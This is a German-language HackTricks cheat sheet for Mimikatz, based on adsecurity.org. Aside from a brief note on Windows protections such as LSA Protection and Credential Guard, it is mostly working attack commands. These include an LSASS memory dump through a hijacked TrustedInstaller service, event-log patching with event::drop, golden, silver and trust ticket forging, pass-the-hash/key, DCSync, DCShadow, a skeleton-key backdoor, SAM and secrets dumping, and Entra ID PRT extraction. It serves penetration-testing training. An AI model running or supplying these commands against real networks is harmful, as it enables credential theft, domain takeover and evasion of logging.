# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Diese Seite basiert auf einer von [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Prüfe das Original für weitere Informationen!

## LM and Clear-Text in memory

Ab Windows 8.1 und Windows Server 2012 R2 wurden erhebliche Maßnahmen implementiert, um sich gegen das Stehlen von credentials zu schützen:

- **LM hashes und Plain-Text-Passwörter** werden nicht mehr im Speicher gespeichert, um die Sicherheit zu erhöhen. Eine spezielle Registry-Einstellung, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ muss mit einem DWORD-Wert von `0` konfiguriert werden, um Digest Authentication zu deaktivieren und sicherzustellen, dass "clear-text"-Passwörter nicht in LSASS zwischengespeichert werden.

- **LSA Protection** wurde eingeführt, um den Prozess Local Security Authority (LSA) vor unautorisiertem Auslesen des Speichers und Code-Injection zu schützen. Dies wird erreicht, indem LSASS als geschützter Prozess markiert wird. Die Aktivierung von LSA Protection umfasst:
1. Änderung der Registry unter _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ durch Setzen von `RunAsPPL` auf `dword:00000001`.
2. Implementierung eines Group Policy Object (GPO), das diese Registry-Änderung auf verwalteten Geräten erzwingt.

Trotz dieser Schutzmechanismen können Tools wie Mimikatz LSA Protection mit bestimmten Treibern umgehen, obwohl solche Aktionen wahrscheinlich in den Event Logs aufgezeichnet werden.

Auf modernen Workstations ist das noch wichtiger, da **Credential Guard auf vielen Windows 11 22H2+ und Windows Server 2025 domain-joined, nicht-DC-Systemen standardmäßig aktiviert ist**, während **LSASS-as-PPL auf frischen Windows 11 22H2+ Installationen standardmäßig aktiviert ist**. In der Praxis bedeutet das, dass `sekurlsa::logonpasswords` oft weniger Material liefert als ältere tradecraft erwarten ließen, und Operatoren zunehmend zu **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** oder **CloudAP/PRT-orientierten Modulen** wechseln. Für die Schutzseite siehe [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administratoren haben typischerweise SeDebugPrivilege, was ihnen ermöglicht, Programme zu debuggen. Dieses Privileg kann eingeschränkt werden, um unautorisierte Memory Dumps zu verhindern, eine häufige Technik, die von Angreifern verwendet wird, um credentials aus dem Speicher zu extrahieren. Selbst wenn dieses Privileg entfernt wurde, kann das TrustedInstaller-Konto weiterhin Memory Dumps mithilfe einer angepassten Service-Konfiguration durchführen:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dies ermöglicht das Dumpen des `lsass.exe`-Speichers in eine Datei, die dann auf einem anderen System analysiert werden kann, um Credentials zu extrahieren:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Event log tampering in Mimikatz umfasst zwei primäre Aktionen: das Löschen von Event logs und das Patchen des Event service, um das Protokollieren neuer Events zu verhindern. Nachfolgend sind die Befehle für diese Aktionen:

#### Clearing Event Logs

- **Command**: Diese Aktion zielt darauf ab, die Event logs zu löschen, um es schwieriger zu machen, bösartige Aktivitäten nachzuverfolgen.
- Mimikatz bietet in seiner Standarddokumentation keinen direkten Befehl zum direkten Löschen von Event logs über die command line. Event log manipulation erfolgt jedoch typischerweise über System tools oder scripts außerhalb von Mimikatz, um bestimmte logs zu löschen (z. B. mit PowerShell oder Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Dieser experimentelle Befehl ist dafür gedacht, das Verhalten des Event Logging Service zu ändern und so effektiv zu verhindern, dass neue Events aufgezeichnet werden.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Der `privilege::debug`-Befehl stellt sicher, dass Mimikatz mit den erforderlichen Privilegien arbeitet, um System services zu verändern.
- Der `event::drop`-Befehl patched anschließend den Event Logging service.

### Kerberos Ticket Attacks

Verwende die folgenden Befehle als schnelle Syntax-Erinnerung. Die speziellen Seiten für [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) und [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) enthalten die aktuellen AES/PAC/opsec-Details.

### Golden Ticket Creation

Ein Golden Ticket ermöglicht die Vortäuschung von domain-weitem Zugriff. Wichtige Befehle und Parameter:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Der Domain-Name.
- `/sid`: Die Security Identifier (SID) der Domain.
- `/user`: Der zu imitierende Benutzername.
- `/krbtgt`: Der NTLM hash des KDC service accounts der Domain.
- `/ptt`: Injiziert das Ticket direkt in den memory.
- `/ticket`: Speichert das Ticket für die spätere Verwendung.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Erstellung

Silver Tickets gewähren Zugriff auf bestimmte Dienste. Wichtige Befehle und Parameter:

- Command: Ähnlich wie Golden Ticket, aber zielt auf bestimmte Dienste ab.
- Parameters:
- `/service`: Der zu zielende Dienst (z. B. cifs, http).
- Weitere Parameter ähnlich wie beim Golden Ticket.

Beispiel:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets werden verwendet, um über Vertrauensbeziehungen auf Ressourcen domänenübergreifend zuzugreifen. Wichtige Befehle und Parameter:

- Command: Ähnlich wie Golden Ticket, aber für Vertrauensbeziehungen.
- Parameters:
- `/target`: Die FQDN der Zieldomäne.
- `/rc4`: Der NTLM-Hash für das Trust-Konto.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Zusätzliche Kerberos-Befehle

- **Tickets auflisten**:

- Befehl: `kerberos::list`
- Listet alle Kerberos-Tickets für die aktuelle Benutzersitzung auf.

- **Pass the Cache**:

- Befehl: `kerberos::ptc`
- Injiziert Kerberos-Tickets aus Cache-Dateien.
- Beispiel: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Befehl: `kerberos::ptt`
- Ermöglicht die Verwendung eines Kerberos-Tickets in einer anderen Sitzung.
- Beispiel: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Tickets bereinigen**:
- Befehl: `kerberos::purge`
- Löscht alle Kerberos-Tickets aus der Sitzung.
- Nützlich vor der Verwendung von Ticket-Manipulationsbefehlen, um Konflikte zu vermeiden.

### Over-Pass-the-Hash / Pass-the-Key

Wenn `RC4` deaktiviert oder unzuverlässig ist, kann Mimikatz **AES128/AES256 Kerberos keys** in die aktuelle Anmeldesitzung patchen, statt nur einen NT hash zu verwenden. Das ist in modernen Domains meist besser geeignet, als `sekurlsa::pth` als nur NTLM zu behandeln.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` verwendet den aktuellen Prozess erneut, statt eine neue Konsole zu starten, was praktisch ist, wenn du sofort Dinge wie `lsadump::dcsync` im selben Kontext ausführen willst.

### Active Directory Tampering

- **DCShadow**: Macht eine Maschine vorübergehend zu einem DC für die Manipulation von AD-Objekten. Siehe [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Täuscht einen DC vor, um Passwortdaten anzufordern. Siehe [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extrahiert Credentials aus LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Imitiert einen DC mithilfe der Passwortdaten eines Computeraccounts.

- _Im ursprünglichen Kontext wurde kein spezifischer Befehl für NetSync angegeben._

- **LSADUMP::SAM**: Greift auf die lokale SAM-Datenbank zu.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Entschlüsselt in der Registry gespeicherte Secrets.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Setzt einen neuen NTLM-Hash für einen Benutzer.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ruft Trust-Authentifizierungsinformationen ab.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Auf **Entra ID**- oder **hybrid-joined**-Hosts kann `sekurlsa::cloudap` gecachte **Primary Refresh Token (PRT)**-Daten aus LSASS offenlegen. Wenn der zugehörige Proof-of-Possession-Schlüssel softwaregeschützt ist, kann `dpapi::cloudapkd` das Klar-/abgeleitete Schlüsselmaterial ableiten, das für nachfolgende **Pass-the-PRT**-Workflows benötigt wird.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Das wird viel schwieriger, wenn der Schlüssel TPM-backed ist, aber es lohnt sich, auf Hybrid-Endpoints zu prüfen, weil die zwischengespeicherten CloudAP-Daten interessanter sein können als die klassische `wdigest`-Ausgabe. Für die cloud-side abuse chain siehe [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Backdoor in LSASS auf einem DC injizieren.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Backup-Rechte erwerben.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug-Privilegien erhalten.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Credentials für angemeldete Benutzer anzeigen.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Kerberos-Tickets aus dem Speicher extrahieren.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: SID und SIDHistory ändern.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Im Originalkontext kein spezifischer Befehl für modify vorhanden._

- **TOKEN::Elevate**: Tokens impersonieren.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Mehrere RDP-Sessions erlauben.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP-Sessions auflisten.
- _Im Originalkontext kein spezifischer Befehl für TS::Sessions angegeben._

### Vault

- Passwörter aus dem Windows Vault extrahieren.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
